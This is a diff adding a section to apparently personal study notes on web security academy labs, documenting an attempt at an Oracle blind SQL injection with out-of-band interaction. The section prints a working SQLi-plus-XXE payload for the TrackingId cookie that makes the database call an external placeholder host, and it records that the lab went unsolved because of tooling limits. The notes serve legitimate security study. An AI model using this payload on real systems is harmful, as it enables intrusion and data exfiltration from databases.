@@ -333,3 +333,30 @@ Extracted the administrator's password directly from the database's own error ou
 
 ### Key Takeaway
 When an app suppresses query results but doesn't handle DB errors gracefully, you can turn the **error message itself into an oracle** — `CAST()` is a reliable way to force a type-conversion error that echoes back arbitrary data, one row at a time.
+
+## Lab 11: Blind SQL injection with out-of-band interaction
+
+**Category:** Blind SQL Injection (Out-of-Band / OAST)
+**Database:** Oracle
+**Objective:** Trigger a DNS lookup to Burp Collaborator via a blind SQLi in the `TrackingId` cookie, using an XXE-based OOB technique.
+
+### Payload
+
+TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
+
+
+### Approach
+- Identified the `TrackingId` cookie as the injection point (query executes async, no reflected output — classic blind/OOB scenario)
+- Used `UNION SELECT EXTRACTVALUE(xmltype(...))` to smuggle an XXE external entity reference into an out-of-band Oracle SQLi payload
+- Payload built to force the DB to make a DNS lookup to an external subdomain when the XML entity is parsed
+- Tested with `interactsh` (`oast.fun`) as a Collaborator substitute since Burp Community Edition lacks a Collaborator client
+- No interaction logged on the interactsh dashboard after sending via Repeater
+
+### Result
+**Not solved — blocked by tooling limitation, not methodology.**
+The Academy's lab firewall explicitly permits OOB callbacks only to Burp Collaborator's default public server (`*.oastify.com` or similar) and blocks arbitrary third-party OOB domains, including `interactsh`. Burp Suite Community Edition does not include a Collaborator client, so this lab cannot be completed without Burp Suite Pro (or a Pro trial).
+
+### Key Takeaway
+Understood and correctly constructed the OOB SQLi + XXE payload chain — the exploitation logic is solid. The blocker is purely infrastructural: OOB/blind SQLi labs requiring Collaborator interaction are gated behind Burp Pro. Revisit this lab once Pro access (trial or licensed) is available to confirm the DNS interaction actually lands.
+
+**Status:** ⏸️ Skipped — conceptually solved, environment-limited. Resume with Burp Pro.
